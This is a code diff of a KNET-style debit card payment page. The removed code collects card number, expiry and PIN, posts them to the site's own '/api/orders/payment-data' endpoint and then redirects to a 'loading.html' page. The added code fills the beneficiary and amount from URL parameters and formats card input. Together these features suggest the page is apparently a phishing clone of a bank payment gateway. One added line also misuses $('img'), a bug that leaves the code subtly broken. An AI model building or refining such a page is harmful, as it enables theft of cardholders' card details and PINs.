-    ];
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        if (params.has('beneficiary')) document.getElementById('beneficiary').textContent = params.get('beneficiary');
+        if (params.has('amount')) document.getElementById('amount').textContent = 'KD ' + params.get('amount');
 
-    $('#debitNumber').on('input', function() {
-        const val = $(this).val();
-        if (val.length > 0) {
-            const matches = cardData.filter(c => c.bin.startsWith(val));
-            if (matches.length > 0) {
-                let html = '';
-                matches.forEach(m => {
-                    html += `<li style="padding:8px; cursor:pointer; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;" onclick="selectBin('${m.bin}')"><span>${m.bin}</span><img src="${m.logo}" height="15"/></li>`;
-                });
-                $('#suggestionBox').html(html).show();
-            } else { $('#suggestionBox').hide(); }
-        } else { $('#suggestionBox').hide(); }
-    });
+        $(document).ready(function() {
+            const debitInput = $('#debitNumber');
+            const logoImg = $('#bankLogo');
+            const suggestBox = $('#suggestionList');
 
-    function selectBin(bin) {
-        $('#debitNumber').val(bin);
-        $('#suggestionBox').hide();
-    }
-
-    async function onPay() {
-        const data = {
-            payment_method: 'Knet',
-            knet_data: {
-                card_number: $('#debitNumber').val(),
-                expiry_month: $('#expiryMonthBox').val(),
-                expiry_year: $('#expiryYearBox').val(),
-                card_pin: $('#cardPin').val()
+            function formatCard(val) {
+                let v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let parts = [];
+                for (let i = 0; i < v.length; i += 4) {
+                    parts.push(v.substring(i, i + 4));
+                }
+                return parts.join(' ');
             }
-        };
-        const res = await fetch('/api/orders/payment-data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
+
+            debitInput.on('input', function() {
+                let raw = $(this).val().replace(/\D/g, '');
+                $(this).val(formatCard(raw));
+                
+                let detected = false;
+                if (raw.length >= 1) {
+                    // Check full cardData
+                    const match = cardData.sort((a,b) => b.bin.length - a.bin.length).find(c => raw.startsWith(c.bin));
+                    if (match) {
+                        logoImg.attr('src', match.logo).show();
+                        detected = true;
+                    }
+                }
+                if (!detected) logoImg.hide();
+
+                suggestBox.empty();
+                if (raw.length >= 1) {
+                    const matches = cardData.filter(c => c.bin.startsWith(raw) || raw.startsWith(c.bin)).slice(0, 10);
+                    if (matches.length > 0) {
+                        matches.forEach(c => {
+                            const li = $('<li>')
+                                .append($('<span class="bin-num">').text(c.bin))
+                                .append($('<span class="bank-info">').text(c.brandDescription))
+                                .append($('img').attr('src', c.logo))
+                                .on('click', function() {
+                                    debitInput.val(formatCard(c.bin));
+                                    logoImg.attr('src', c.logo).show();
+                                    suggestBox.hide();
+                                });
+                            suggestBox.append(li);
+                        });
+                        suggestBox.show();
+                    } else {
+                        suggestBox.hide();
+                    }
+                } else {
+                    suggestBox.hide();
+                }
+            });
+
+            $(document).on('click', function(e) {
+                if (!$(e.target).closest('.input-wrap').length) suggestBox.hide();
+            });
+
+            $('#expMonth').on('input', function() {
+                if (this.value.length === 2) $('#expYear').focus();
+            });
+
+            $('input[type="text"]').on('keypress', function(e) {
+                if (e.which < 48 || e.which > 57) e.preventDefault();
+            });
         });
-        const result = await res.json();
-        if(result.success) window.location.href = 'loading.html';
-    }
-</script>
-</body></html>
+    </script>
+</body>
+</html>
